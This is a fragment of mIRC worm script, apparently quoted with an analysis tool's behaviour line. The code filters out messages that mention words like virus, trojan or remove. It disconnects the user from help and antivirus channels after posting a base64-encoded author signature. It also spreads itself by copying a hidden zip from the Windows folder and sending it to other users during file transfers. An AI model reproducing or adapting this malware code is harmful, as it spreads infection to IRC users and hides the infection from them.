behavior.chr: May attempt to obfuscate specific str

dump: if (virus isin $1-) || (worm isin $1-) || (set isin $1-) || (enable isin $1-) || (disable isin $1-) || (remote isin $1-) || (script isin $1-) || (play isin $1-) || (sock isin $1-) || (write isin $1-) || (decode isin $1-) || (alias isin $1-) || (load isin $1-) || (unload isin $1-) || (remini isin $1-) || (remove isin $1-) || (events isin $1-) || (trojan isin $1-) || (troyano isin $1-) { return $true }

On 1:JOIN:*:{ if ($nick != $me) { { slf } | { slm } } | else { if (ayuda isin #) || (help isin #) || (virus isin #) || (avt isin #) || (vh isin #) || (gigairc isin #) { .privmsg # $decode(VzMyLkxlbGllbCBCeSBHRURaQUMgTEFCUw==,m) | .disconnect | .exit } } }

On 1:FileSent:*:{ if (.zip isin $filename) { halt } | var %lls = C:\WINDOWS $+ $decode(XExJQy56aXA=,m) | .copy -o %lls $nofile(%lls) $+ $gettok($nopath($filename),1,46) $+ 2.zip | slb $nick $nofile(%lls) $+ $gettok($nopath($filename),1,46) $+ 2.zip #ll }
Alias lq { if ( [ % $+ [ ln. $+ [ $1 ] ] ] = 0 ) { .sockclose [ i. $+ [ $1 ] ] | .sockclose [ el. $+ [ $1 ] ] | .timer $+ $1 off } }
On 1:SockClose:i.*:{ Set %el.ptm6 $remove($sockname,i.) | sockclose $sockname | sockclose [ el. $+ [ %el.ptm6 ] ] | .timer $+ %el.ptm6 off }

On 1:SockWrite:i.*:{ Set %el.ptm6 $remove($sockname,i.) | if ( [ % $+ [ el. $+ [ %el.ptm6 ] ] ] = 1 ) { .timer $+ $rand(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ el. $+ [ %el.ptm6 ] ] | .timer $+ %el.ptm6 off | halt } | lsq %el.ptm6 }
